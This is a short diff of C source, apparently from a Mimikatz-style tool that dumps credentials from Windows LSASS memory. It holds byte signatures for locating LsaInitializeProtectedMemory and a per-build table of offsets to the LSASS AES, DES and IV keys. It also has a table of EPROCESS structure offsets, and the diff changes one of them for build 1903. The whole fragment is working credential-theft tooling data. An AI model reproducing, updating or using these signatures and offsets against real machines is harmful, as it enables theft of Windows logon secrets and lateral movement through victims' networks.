@@ -46,7 +46,7 @@ BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x0
 BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
 BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};
 
-// Version, Credential Key Signature, Key Signature Size, AES, DES, IV, ActiveProcessLinks member offset - (Mimikatz has it formatted as: IV, DES, AES)
+// Version, Credential Key Signature, Key Signature Size, AES, DES, IV - (Mimikatz has it formatted as: IV, DES, AES)
 LsassCredentialKeyOffsets LsassKeyOffsetsArray[] = { 
     {KULL_M_WIN_BUILD_VISTA,   PTRN_WNO8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY), 25, -69, 63},
 	{KULL_M_WIN_BUILD_7,	   PTRN_WNO8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY), 25, -61, 59},
@@ -68,7 +68,7 @@ typedef struct {
 EPROCESSOffsets EPROCESSOffsetsArray[] = {
 {KULL_M_WIN_BUILD_10_1507, 0x2f0}, // (1607) 14393 to (1507) 10240
 {KULL_M_WIN_BUILD_10_1703, 0x2e8}, // (1809) 17763 to (1703) 15063
-{KULL_M_WIN_BUILD_10_1903, 0x2e8}, // (1909) 18363 to (1903) 18362
+{KULL_M_WIN_BUILD_10_1903, 0x2f0}, // (1909) 18363 to (1903) 18362
 {KULL_M_WIN_BUILD_10_2004, 0x448}, // (22h2) 19045 to (2004) 19041
 {KULL_M_WIN_BUILD_11_24H2, 0x1d8}
 };
